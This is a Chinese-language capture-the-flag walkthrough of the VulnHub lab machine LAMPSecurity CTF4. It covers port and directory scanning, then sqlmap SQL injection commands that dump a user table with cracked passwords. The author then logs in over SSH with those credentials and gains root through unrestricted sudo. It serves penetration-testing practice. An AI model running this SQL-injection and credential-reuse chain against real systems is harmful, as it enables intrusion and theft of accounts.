# LAMPSecurity: CTF4

2024-6-4 https://www.vulnhub.com/entry/lampsecurity-ctf4,83/

difficulty: easy

## IP

192.168.10.191

## Scan

Open Port -> 22,25,80,631

```
PORT    STATE  SERVICE VERSION
22/tcp  open   ssh     OpenSSH 4.3 (protocol 2.0)
25/tcp  open   smtp?
| smtp-commands: ctf4.sas.upenn.edu Hello [192.168.10.3], pleased to meet you, ENHANCEDSTATUSCODES, PIPELINING, EXPN, VERB, 8BITMIME, SIZE, DSN, ETRN, DELIVERBY, HELP
|_ 2.0.0 This is sendmail version 8.13.5 2.0.0 Topics: 2.0.0 HELO EHLO MAIL RCPT DATA 2.0.0 RSET NOOP QUIT HELP VRFY 2.0.0 EXPN VERB ETRN DSN AUTH 2.0.0 STARTTLS 2.0.0 For more info use "HELP <topic>". 2.0.0 To report bugs in the implementation send email to 2.0.0 sendmail-bugs@sendmail.org. 2.0.0 For local information send email to Postmaster at your site. 2.0.0 End of HELP info
80/tcp  open   http    Apache httpd 2.2.0 ((Fedora))
|_http-server-header: Apache/2.2.0 (Fedora)
631/tcp closed ipp
```

估计 80 能进入系统，gobuster 进行扫描：

```
http://192.168.10.191/images               (Status: 301) [Size: 316] [--> http://192.168.10.191/images/]
http://192.168.10.191/index.html           (Status: 200) [Size: 3479]
http://192.168.10.191/pages                (Status: 301) [Size: 315] [--> http://192.168.10.191/pages/]
http://192.168.10.191/calendar             (Status: 301) [Size: 318] [--> http://192.168.10.191/calendar/]
http://192.168.10.191/mail                 (Status: 301) [Size: 314] [--> http://192.168.10.191/mail/]
http://192.168.10.191/admin                (Status: 301) [Size: 315] [--> http://192.168.10.191/admin/]
http://192.168.10.191/usage                (Status: 301) [Size: 315] [--> http://192.168.10.191/usage/]
http://192.168.10.191/robots.txt           (Status: 200) [Size: 104]
http://192.168.10.191/inc                  (Status: 301) [Size: 313] [--> http://192.168.10.191/inc/]
http://192.168.10.191/sql                  (Status: 301) [Size: 313] [--> http://192.168.10.191/sql/]
```

/robots.txt 显示：

```
User-agent: *
Disallow: /mail/
Disallow: /restricted/
Disallow: /conf/
Disallow: /sql/
Disallow: /admin/
```

http://192.168.10.191/sql/ 发现 db.sql 备份文件，看看有没有用户凭据等信息，只看到了建表 sql：

```
use ehks;
create table user (user_id int not null auto_increment primary key, user_name varchar(20) not null, user_pass varchar(32) not null);
create table blog (blog_id int primary key not null auto_increment, blog_title varchar(255), blog_body text, blog_date datetime not null);
create table comment (comment_id int not null auto_increment primary key, comment_title varchar (50), comment_body text, comment_author varchar(50), comment_url varchar(50), comment_date datetime not null);
```

http://192.168.10.191/admin/ 发现登陆页面，需要输入用户凭据。底部看到的是 webmaster 的 cms,经过查询找到了 2 个 Password Disclosure 但是都没有利用成功，估计是把 passwd txt 文件删除了。

在仔细看看 80 对应的首页内容，看到 http://192.168.10.191/index.html?page=blog&title=Blog&id=2' 出现报错， 这里可能存在 sql 注入，尝试用 sqlmap 进行测试，发现存在：

```
sqlmap -u 'http://192.168.10.191/index.html?page=blog&title=Blog&id=2' --level 3 -dbs --batch

available databases [6]:
[*] calendar
[*] ehks
[*] information_schema
[*] mysql
[*] roundcubemail
[*] test
```

这个 index.php 对应的库应该是 ehks，爆一下表看看：

```
sqlmap -u 'http://192.168.10.191/index.html?page=blog&title=Blog&id=2' --level 3 --batch -D ehks --tables

+---------+
| comment |
| user    |
| blog    |
+---------+

sqlmap -u 'http://192.168.10.191/index.html?page=blog&title=Blog&id=2' --level 3 --batch -D ehks -T user --dump

+---------+-----------+--------------------------------------------------+
| user_id | user_name | user_pass                                        |
+---------+-----------+--------------------------------------------------+
| 1       | dstevens  | 02e823a15a392b5aa4ff4ccb9060fa68 (ilike2surf)    |
| 2       | achen     | b46265f1e7faa3beab09db5c28739380 (seventysixers) |
| 3       | pmoore    | 8f4743c04ed8e5f39166a81f26319bb5 (Homesite)      |
| 4       | jdurbin   | 7c7bc9f465d86b8164686ebb5151a717 (Sue1978)       |
| 5       | sorzek    | 64d1f88b9b276aece4b0edcc25b7a434 (pacman)        |
| 6       | ghighland | 9f3eb3087298ff21843cc4e013cf355f (undone1)       |
+---------+-----------+--------------------------------------------------+
```

用其中的一个用户凭据登陆到后台后，发表文章出，写入 php web shell，但是发现尖括号被转义了，不能触发 php 执行。

在尝试用这几个得到的用户凭据，进行 ssh 登陆，发现 dstevens:ilike2surf、achen:seventysixers、pmoore:Homesite、jdurbin:Sue1978、sorzek:pacman、ghighland:undone1 能够进入系统。

经过查看，发现 achen 具有完全的 sudo 执行权限，所以直接可以提升到 root 权限：

```
[achen@ctf4 home]$ sudo -l
User achen may run the following commands on this host:
    (ALL) NOPASSWD: ALL

[achen@ctf4 home]$ sudo su
[root@ctf4 home]# id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel) context=user_u:system_r:unconfined_t:SystemLow-SystemHigh
[root@ctf4 home]# cd /root
[root@ctf4 ~]# ls
anaconda-ks.cfg  Desktop  install.log  install.log.syslog
```
